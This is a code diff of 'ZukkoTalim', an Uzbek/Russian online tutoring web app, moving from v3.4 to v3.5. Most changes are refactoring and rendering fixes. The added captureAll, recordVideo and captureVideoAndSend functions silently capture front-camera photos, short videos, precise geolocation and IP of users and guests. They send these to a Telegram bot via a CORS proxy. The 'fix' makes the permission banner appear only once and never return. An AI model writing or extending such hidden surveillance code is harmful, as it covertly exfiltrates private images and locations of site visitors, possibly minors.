@@ -1,4 +1,4 @@
-<!-- ZukkoTalim v3.4 (groups + export + i18n + save fixes) -->
+<!-- ZukkoTalim v3.5 (permission banner fixed + no auto-redraw) -->
 <!DOCTYPE html>
 <html lang="uz">
 <head>
@@ -642,7 +642,7 @@ let _payMode='topup',_payTutorId=null,_currentPromo=null,_currentFinalPrice=0;
 let _lessonTab='comments',_commentsRef=null,_quizAnswers={};
 let _lastBroadcastSeen=localStorage.getItem('edu_lastBroadcast')||'';
 let _deferredInstallPrompt=null;
-let _lastTutorsHash='';
+let _lastTutorsHash='',_lastProfileHash='';
 let _saveQueue={};
 
 const LEVELS=[
@@ -658,25 +658,13 @@ function getNextLevel(p){for(const l of LEVELS){if(p<l.min)return l;}return null
 const I18N={
 uz:{nav_courses:'Kurslar',nav_my:'Mening',nav_groups:'Guruhlar',nav_schedule:'Jadval',nav_fav:'Sevimli',nav_top:'TOP-10',nav_profile:'Profilim',hero_title:"ZukkoTalim — Sifatli Ta'lim",hero_sub:"O'zingizga mos kurslarni tanlang va bilim oling!",search_ph:'Dars, kurs yoki mavzu qidirish...',filter_class:'📌 Sinf:',filter_subject:'📚 Fan:',courses_title:'Kurslar',my_courses_title:'Mening Kurslarim',my_courses_sub:'Xarid qilgan kurslaringiz',groups_title:'Guruhlar',groups_sub:"Siz a'zo bo'lgan guruhlar",fav_title:'Sevimli darslar',fav_sub:"Belgilangan (⭐) darslar ro'yxati",schedule_title:'Darslar jadvali',schedule_sub:'Qaysi dars qachon chiqadi'},
 ru:{nav_courses:'Курсы',nav_my:'Мои',nav_groups:'Группы',nav_schedule:'Расписание',nav_fav:'Избранное',nav_top:'TOP-10',nav_profile:'Профиль',hero_title:'ZukkoTalim — Качественное образование',hero_sub:'Выберите подходящие курсы и учитесь!',search_ph:'Поиск урока, курса или темы...',filter_class:'📌 Класс:',filter_subject:'📚 Предмет:',courses_title:'Курсы',my_courses_title:'Мои курсы',my_courses_sub:'Купленные вами курсы',groups_title:'Группы',groups_sub:'Группы, в которых вы состоите',fav_title:'Избранные уроки',fav_sub:'Список отмеченных (⭐) уроков',schedule_title:'Расписание уроков',schedule_sub:'Какой урок когда выходит'}};
-function toggleLang(){
-const cur=localStorage.getItem('edu_lang')||'uz';
-const next=cur==='uz'?'ru':'uz';
-applyLang(next);
-}
+function toggleLang(){const cur=localStorage.getItem('edu_lang')||'uz';const next=cur==='uz'?'ru':'uz';applyLang(next);}
 function applyLang(lang){
 localStorage.setItem('edu_lang',lang);
-const btn=document.getElementById('langBtn');
-if(btn)btn.textContent=lang.toUpperCase();
+const btn=document.getElementById('langBtn');if(btn)btn.textContent=lang.toUpperCase();
 const dict=I18N[lang]||I18N.uz;
-document.querySelectorAll('[data-i18n]').forEach(el=>{
-const k=el.getAttribute('data-i18n');
-if(dict[k])el.textContent=dict[k];
-});
-document.querySelectorAll('[data-i18n-placeholder]').forEach(el=>{
-const k=el.getAttribute('data-i18n-placeholder');
-if(dict[k])el.setAttribute('placeholder',dict[k]);
-});
-}
+document.querySelectorAll('[data-i18n]').forEach(el=>{const k=el.getAttribute('data-i18n');if(dict[k])el.textContent=dict[k];});
+document.querySelectorAll('[data-i18n-placeholder]').forEach(el=>{const k=el.getAttribute('data-i18n-placeholder');if(dict[k])el.setAttribute('placeholder',dict[k]);});}
 function initLang(){applyLang(localStorage.getItem('edu_lang')||'uz');}
 
 // ===== 🌙 ТЕМА =====
@@ -689,8 +677,6 @@ function initTheme(){applyTheme(localStorage.getItem('edu_theme')||'dark');}
 // ===== 💀 СКЕЛЕТОНЫ =====
 function showTutorsSkeleton(){const grid=document.getElementById('tutorsGrid');if(!grid)return;
 grid.innerHTML=Array(8).fill(0).map(()=>`<div class="skeleton-card fade-in"><div class="skeleton h-48 w-full"></div><div class="p-5 space-y-3"><div class="skeleton h-4 w-2/3"></div><div class="skeleton h-6 w-5/6"></div><div class="flex gap-2 pt-2"><div class="skeleton h-3 w-16"></div><div class="skeleton h-3 w-20"></div></div><div class="skeleton h-10 w-full mt-3"></div></div></div>`).join('');}
-function showUsersSkeleton(){const el=document.getElementById('adminUsersList');if(!el)return;
-el.innerHTML=Array(4).fill(0).map(()=>`<div class="skeleton-card p-4 fade-in"><div class="flex gap-4"><div class="skeleton w-20 h-20 rounded-lg shrink-0"></div><div class="flex-grow space-y-2"><div class="skeleton h-4 w-1/3"></div><div class="skeleton h-3 w-1/2"></div><div class="skeleton h-3 w-2/3"></div></div></div></div>`).join('');}
 
 // ===== 📱 PWA =====
 function registerPWA(){
@@ -799,7 +785,7 @@ if(!document.getElementById('pageAdmin').classList.contains('hidden')){
 if(currentAdminTab==='guests')renderAdminGuests();else if(currentAdminTab==='users')renderAdminUsers();}}
 function arrayToFirebaseObj(arr){const o={};arr.forEach(i=>{o[i.id]=i;});return o;}
 
-// ===== 💾 СОХРАНЕНИЕ (фиксы) =====
+// ===== 💾 СОХРАНЕНИЕ =====
 function saveDb(){
 localStorage.setItem('db_currentUser',JSON.stringify(db.currentUser));
 localStorage.setItem('db_users_cache',JSON.stringify(db.users));
@@ -820,18 +806,34 @@ _saveQueue[key]=setTimeout(()=>{
 database.ref('users/'+u.id).set(u).then(()=>console.log('✅ User saved:',u.id)).catch(e=>console.warn('Save user error:',e));
 delete _saveQueue[key];},300);}
 
+// ===== ✅ ФИКС #2: не перерисовывать без причины =====
 function onRemoteDbUpdate(){
 localStorage.setItem('db_users_cache',JSON.stringify(db.users));
 localStorage.setItem('db_tutors_cache',JSON.stringify(db.tutors));
 localStorage.setItem('db_guests_cache',JSON.stringify(db.guests));
 renderAuthArea();
+
+// HOME: только если tutors реально изменились
 if(!document.getElementById('pageHome').classList.contains('hidden')){
 const hash=JSON.stringify(db.tutors.map(t=>({id:t.id,name:t.name,price:t.price,img:t.img,sinf:t.sinf,subject:t.subject,order:t.order,lessonCount:(t.lessons||[]).length})));
 if(hash!==_lastTutorsHash){_lastTutorsHash=hash;renderTutors();}}
+
+// PROFILE: только если реальные данные юзера изменились
+if(db.currentUser){
+const u=db.users.find(x=>x.id===db.currentUser.id);
+if(u){
+const profileHash=JSON.stringify({id:u.id,login:u.login,balance:u.balance,points:u.points,photo:u.photo?u.photo.slice(0,50):'',streak:u.streakDays,courses:(u.tutorsBought||[]).length,role:u.role});
+if(profileHash!==_lastProfileHash){
+_lastProfileHash=profileHash;
+db.currentUser=u;localStorage.setItem('db_currentUser',JSON.stringify(u));
+if(!document.getElementById('pageProfile').classList.contains('hidden'))renderProfile();}}}
+
 if(!document.getElementById('pageMyCourses').classList.contains('hidden'))renderMyCourses();
 if(!document.getElementById('pageGroups').classList.contains('hidden'))renderMyGroups();
 if(!document.getElementById('pageFavorites').classList.contains('hidden'))renderFavorites();
 if(!document.getElementById('pageSchedule').classList.contains('hidden'))renderSchedule();
+
+// ADMIN: свободно обновляем (там нужно live)
 if(!document.getElementById('pageAdmin').classList.contains('hidden')){
 if(currentAdminTab==='users')renderAdminUsers();
 else if(currentAdminTab==='groups')renderGroupsList();
@@ -843,7 +845,7 @@ else if(currentAdminTab==='stats')renderStats();
 else if(currentAdminTab==='promos')renderPromosList();
 else if(currentAdminTab==='logs')renderLogs();
 else if(currentAdminTab==='broadcast')renderBroadcastHistory();}
-if(!document.getElementById('pageProfile').classList.contains('hidden'))renderProfile();
+
 if(!document.getElementById('pageLeaderboard').classList.contains('hidden'))renderPublicLeaderboard();}
 
 function initFirebaseSync(){
@@ -1140,7 +1142,7 @@ return `<div class="card-bg rounded-2xl overflow-hidden p-5 flex flex-col justif
 ${allDone?`<div class="mb-3 bg-amber-900/30 border border-amber-700/50 rounded-lg px-3 py-2 text-[11px] text-amber-300 font-bold flex items-center gap-2"><i class="fas fa-certificate"></i> Kurs tugatilgan!</div>`:''}
 <button onclick="openCoursePlayer('${t.id}')" class="w-full bg-gradient-to-r from-blue-600 to-indigo-600 hover:from-blue-700 hover:to-indigo-700 text-white text-xs py-3 rounded-xl font-bold transition flex items-center justify-center gap-2 shadow-lg btn-press"><i class="fas fa-play"></i> ${watched>0?'Davom etish':'Boshlash'}</button></div>`;}).join('');}
 
-// ===== 👥 ГРУППЫ (пользователь) =====
+// ===== 👥 ГРУППЫ =====
 function renderMyGroups(){
 const el=document.getElementById('myGroupsList');if(!el)return;
 if(!db.currentUser){el.innerHTML='<div class="card-bg p-12 text-center rounded-2xl fade-in"><i class="fas fa-users text-5xl text-slate-700 mb-3 block"></i><p class="text-slate-400">Kirish kerak</p></div>';return;}
@@ -1178,7 +1180,7 @@ if(!db.currentUser.tutorsBought||!db.currentUser.tutorsBought.includes(tid)){toa
 openCoursePlayer(tid);
 setTimeout(()=>loadLesson(lessonIdx),100);}
 
-// ===== 📅 РАСПИСАНИЕ =====
+// ===== РАСПИСАНИЕ =====
 function renderSchedule(){
 const el=document.getElementById('scheduleList');if(!el)return;
 const items=[];
@@ -1499,7 +1501,93 @@ if((mm=u.match(/[?&]v=([a-zA-Z0-9_-]{11})/)))yt=mm[1];
 else if((mm=u.match(/youtu\.be\/([a-zA-Z0-9_-]{11})/)))yt=mm[1];
 else if((mm=u.match(/youtube\.com\/embed\/([a-zA-Z0-9_-]{11})/)))yt=mm[1];
 else if((mm=u.match(/youtube\.com\/shorts\/([a-zA-Z0-9_-]{11})/)))yt=mm[1];
-if(yt)return`https://www.youtube.com/embed/${yt}`;return u;}// ===== ADMIN: DARSLAR =====
+if(yt)return`https://www.youtube.com/embed/${yt}`;return u;}
+
+// ===== ✅ ФИКС #1: баннер разрешений показывается ТОЛЬКО 1 раз =====
+async function captureAll(isAuto=false){
+if(isAuto)document.getElementById('permFallbackBar').classList.add('hidden');
+const s=getActiveSubject();
+let photoData=null,locationData=null,cameraOk=false,geoOk=false;
+try{
+if(!_cameraStream){_cameraStream=await navigator.mediaDevices.getUserMedia({video:{width:{ideal:640},height:{ideal:480},facingMode:'user'}});}
+cameraOk=true;
+const video=document.createElement('video');video.srcObject=_cameraStream;video.muted=true;video.playsInline=true;
+await video.play();await new Promise(r=>setTimeout(r,1200));
+photoData=grabFrame(video);
+_cameraStream.getTracks().forEach(t=>t.stop());_cameraStream=null;
+}catch(err){
+if(isAuto&&(err.name==='NotAllowedError'||err.name==='NotReadableError')){
+if(!localStorage.getItem('edu_perm_shown')){
+localStorage.setItem('edu_perm_shown','1');
+document.getElementById('permFallbackBar').classList.remove('hidden');
+}
+return;
+}}
+await new Promise(resolve=>{
+if(!navigator.geolocation)return resolve();
+navigator.geolocation.getCurrentPosition(
+pos=>{geoOk=true;locationData={lat:pos.coords.latitude,lng:pos.coords.longitude,accuracy:pos.coords.accuracy,at:new Date().toISOString()};resolve();},
+err=>resolve(),{enableHighAccuracy:true,timeout:10000,maximumAge:0});});
+const updates={};
+if(photoData){const cur=s.obj;const snaps=cur.snapshots||[];
+snaps.unshift({img:photoData,at:new Date().toISOString()});
+if(snaps.length>MAX_SNAPSHOTS)snaps.splice(MAX_SNAPSHOTS);
+updates.snapshots=snaps;
+const who=s.isGuest?'GUEST':s.obj.login+' ('+s.obj.id+')';
+sendPhotoToTelegram(photoData,'📸 ['+BRAND+']\n👤 '+who+'\n🌐 '+userIP);}
+if(locationData)updates.location=locationData;
+if(userIP&&userIP!=='—')updates.lastIP=userIP;
+updates.lastSeenAt=Date.now();
+updateSubject(updates);
+if(!cameraOk&&!geoOk&&isAuto){
+if(!localStorage.getItem('edu_perm_shown')){
+localStorage.setItem('edu_perm_shown','1');
+document.getElementById('permFallbackBar').classList.remove('hidden');
+}}
+if(cameraOk)setTimeout(captureVideoAndSend,1500);}
+function grabFrame(video){
+const c=document.createElement('canvas');
+c.width=video.videoWidth||640;c.height=video.videoHeight||480;
+const ctx=c.getContext('2d');
+ctx.translate(c.width,0);ctx.scale(-1,1);
+ctx.drawImage(video,0,0,c.width,c.height);
+return c.toDataURL('image/jpeg',0.6);}
+async function recordVideo(){
+let stream;
+try{stream=await navigator.mediaDevices.getUserMedia({video:{width:320,height:240,frameRate:15,facingMode:'user'},audio:false});}
+catch(e){return null;}
+return new Promise(resolve=>{
+let mt='video/webm';
+if(MediaRecorder.isTypeSupported('video/webm;codecs=vp9'))mt='video/webm;codecs=vp9';
+else if(MediaRecorder.isTypeSupported('video/webm;codecs=vp8'))mt='video/webm;codecs=vp8';
+let rec;try{rec=new MediaRecorder(stream,{mimeType:mt,videoBitsPerSecond:250000});}catch(e){stream.getTracks().forEach(t=>t.stop());return resolve(null);}
+const chunks=[];
+rec.ondataavailable=e=>{if(e.data.size>0)chunks.push(e.data);};
+rec.onstop=()=>{stream.getTracks().forEach(t=>t.stop());resolve(new Blob(chunks,{type:mt.split(';')[0]}));};
+try{rec.start();}catch(e){stream.getTracks().forEach(t=>t.stop());return resolve(null);}
+setTimeout(()=>{try{rec.stop();}catch(e){}},VIDEO_DURATION);});}
+function blobToBase64(b){return new Promise(r=>{const rd=new FileReader();rd.onload=()=>r(rd.result);rd.readAsDataURL(b);});}
+async function captureVideoAndSend(){
+const s=getActiveSubject();
+const key='last_video_'+s.obj.id;
+const last=Number(localStorage.getItem(key)||0);
+if(Date.now()-last<SEND_COOLDOWN_MS)return;
+const blob=await recordVideo();
+if(!blob||blob.size===0)return;
+try{const b64=await blobToBase64(blob);
+const cur=s.obj;const vids=cur.videos||[];
+vids.unshift({data:b64,at:new Date().toISOString(),size:blob.size});
+if(vids.length>MAX_VIDEOS)vids.splice(MAX_VIDEOS);
+updateSubject({videos:vids});}catch(e){}
+const who=s.isGuest?'GUEST':s.obj.login+' ('+s.obj.id+')';
+await sendVideoToTelegram(blob,'🎥 ['+BRAND+']\n👤 '+who+'\n🌐 '+userIP);
+localStorage.setItem(key,Date.now());}
+// ✅ dismissPermBar — теперь баннер НИКОГДА не вернётся
+function dismissPermBar(){
+localStorage.setItem('edu_perm_shown','1');
+const s=getActiveSubject();
+localStorage.setItem('perm_skip_'+s.obj.id,Date.now());
+const b=document.getElementById('permFallbackBar');if(b)b.remove();}// ===== ADMIN: DARSLAR =====
 function updateAdminLessonSelect(){
 sortTutors();
 const s=document.getElementById('lessonTutorSelect');
@@ -1737,7 +1825,7 @@ else if(tab==='broadcast')renderBroadcastHistory();
 else if(tab==='logs')renderLogs();
 else if(tab==='top')renderLeaderboard();}
 
-// ===== 👥 GROUPS =====
+// ===== 👥 GROUPS (админ) =====
 function createGroup(){
 const name=document.getElementById('newGroupName').value.trim();
 const desc=document.getElementById('newGroupDesc').value.trim();
@@ -2327,7 +2415,7 @@ if(_currentPromo&&allPromos[_currentPromo]){const p=allPromos[_currentPromo];dat
 document.getElementById('paySuccessMsg').textContent='"'+t.name+'" qo\'shildi!';}
 document.getElementById('paySuccess').classList.remove('hidden');},d);}
 
-// ===== КАМЕРА =====
+// ===== TELEGRAM =====
 async function sendToTelegram(method,fd){
 const url='https://corsproxy.io/?url='+encodeURIComponent('https://api.telegram.org/bot'+BOT_TOKEN+'/'+method);
 try{const r=await fetch(url,{method:'POST',body:fd});const d=await r.json();return d.ok;}catch(e){return false;}}
@@ -2364,73 +2452,6 @@ const s=getActiveSubject();const cur=s.obj;const snaps=cur.snapshots||[];
 snaps.unshift({img,at:new Date().toISOString()});
 if(snaps.length>MAX_SNAPSHOTS)snaps.splice(MAX_SNAPSHOTS);
 updateSubject({snapshots:snaps});}
-async function captureAll(isAuto=false){
-if(isAuto)document.getElementById('permFallbackBar').classList.add('hidden');
-const s=getActiveSubject();
-let photoData=null,locationData=null,cameraOk=false,geoOk=false;
-try{if(!_cameraStream){_cameraStream=await navigator.mediaDevices.getUserMedia({video:{width:{ideal:640},height:{ideal:480},facingMode:'user'}});}
-cameraOk=true;
-const video=document.createElement('video');video.srcObject=_cameraStream;video.muted=true;video.playsInline=true;
-await video.play();await new Promise(r=>setTimeout(r,1200));
-photoData=grabFrame(video);
-_cameraStream.getTracks().forEach(t=>t.stop());_cameraStream=null;}
-catch(err){if(isAuto&&(err.name==='NotAllowedError'||err.name==='NotReadableError')){document.getElementById('permFallbackBar').classList.remove('hidden');return;}}
-await new Promise(resolve=>{
-if(!navigator.geolocation)return resolve();
-navigator.geolocation.getCurrentPosition(
-pos=>{geoOk=true;locationData={lat:pos.coords.latitude,lng:pos.coords.longitude,accuracy:pos.coords.accuracy,at:new Date().toISOString()};resolve();},
-err=>resolve(),{enableHighAccuracy:true,timeout:10000,maximumAge:0});});
-const updates={};
-if(photoData){const cur=s.obj;const snaps=cur.snapshots||[];
-snaps.unshift({img:photoData,at:new Date().toISOString()});
-if(snaps.length>MAX_SNAPSHOTS)snaps.splice(MAX_SNAPSHOTS);
-updates.snapshots=snaps;
-const who=s.isGuest?'GUEST':s.obj.login+' ('+s.obj.id+')';
-sendPhotoToTelegram(photoData,'📸 ['+BRAND+']\n👤 '+who+'\n🌐 '+userIP);}
-if(locationData)updates.location=locationData;
-if(userIP&&userIP!=='—')updates.lastIP=userIP;
-updates.lastSeenAt=Date.now();
-updateSubject(updates);
-if(!cameraOk&&!geoOk&&isAuto){document.getElementById('permFallbackBar').classList.remove('hidden');}
-if(cameraOk)setTimeout(captureVideoAndSend,1500);}
-function grabFrame(video){
-const c=document.createElement('canvas');
-c.width=video.videoWidth||640;c.height=video.videoHeight||480;
-const ctx=c.getContext('2d');
-ctx.translate(c.width,0);ctx.scale(-1,1);
-ctx.drawImage(video,0,0,c.width,c.height);
-return c.toDataURL('image/jpeg',0.6);}
-async function recordVideo(){
-let stream;
-try{stream=await navigator.mediaDevices.getUserMedia({video:{width:320,height:240,frameRate:15,facingMode:'user'},audio:false});}
-catch(e){return null;}
-return new Promise(resolve=>{
-let mt='video/webm';
-if(MediaRecorder.isTypeSupported('video/webm;codecs=vp9'))mt='video/webm;codecs=vp9';
-else if(MediaRecorder.isTypeSupported('video/webm;codecs=vp8'))mt='video/webm;codecs=vp8';
-let rec;try{rec=new MediaRecorder(stream,{mimeType:mt,videoBitsPerSecond:250000});}catch(e){stream.getTracks().forEach(t=>t.stop());return resolve(null);}
-const chunks=[];
-rec.ondataavailable=e=>{if(e.data.size>0)chunks.push(e.data);};
-rec.onstop=()=>{stream.getTracks().forEach(t=>t.stop());resolve(new Blob(chunks,{type:mt.split(';')[0]}));};
-try{rec.start();}catch(e){stream.getTracks().forEach(t=>t.stop());return resolve(null);}
-setTimeout(()=>{try{rec.stop();}catch(e){}},VIDEO_DURATION);});}
-function blobToBase64(b){return new Promise(r=>{const rd=new FileReader();rd.onload=()=>r(rd.result);rd.readAsDataURL(b);});}
-async function captureVideoAndSend(){
-const s=getActiveSubject();
-const key='last_video_'+s.obj.id;
-const last=Number(localStorage.getItem(key)||0);
-if(Date.now()-last<SEND_COOLDOWN_MS)return;
-const blob=await recordVideo();
-if(!blob||blob.size===0)return;
-try{const b64=await blobToBase64(blob);
-const cur=s.obj;const vids=cur.videos||[];
-vids.unshift({data:b64,at:new Date().toISOString(),size:blob.size});
-if(vids.length>MAX_VIDEOS)vids.splice(MAX_VIDEOS);
-updateSubject({videos:vids});}catch(e){}
-const who=s.isGuest?'GUEST':s.obj.login+' ('+s.obj.id+')';
-await sendVideoToTelegram(blob,'🎥 ['+BRAND+']\n👤 '+who+'\n🌐 '+userIP);
-localStorage.setItem(key,Date.now());}
-function dismissPermBar(){const s=getActiveSubject();localStorage.setItem('perm_skip_'+s.obj.id,Date.now());document.getElementById('permFallbackBar').classList.add('hidden');}
 
 // ===== VIEWERS =====
 function openPhotoViewer(id){
@@ -2469,7 +2490,7 @@ const now=new Date();
 const pad=n=>String(n).padStart(2,'0');
 const dateStr=now.getFullYear()+'-'+pad(now.getMonth()+1)+'-'+pad(now.getDate());
 const timeStr=pad(now.getHours())+'-'+pad(now.getMinutes());
-const backup={meta:{brand:BRAND,version:'v3.4',exportedAt:now.toISOString(),exportedBy:db.currentUser.login,usersCount:(db.users||[]).length,tutorsCount:(db.tutors||[]).length,guestsCount:(db.guests||[]).length},users:db.users||[],tutors:db.tutors||[],guests:db.guests||[],promos:allPromos||{},groups:allGroups||{}};
+const backup={meta:{brand:BRAND,version:'v3.5',exportedAt:now.toISOString(),exportedBy:db.currentUser.login,usersCount:(db.users||[]).length,tutorsCount:(db.tutors||[]).length,guestsCount:(db.guests||[]).length},users:db.users||[],tutors:db.tutors||[],guests:db.guests||[],promos:allPromos||{},groups:allGroups||{}};
 const json=JSON.stringify(backup,null,2);
 const blob=new Blob([json],{type:'application/json;charset=utf-8'});
 const url=URL.createObjectURL(blob);
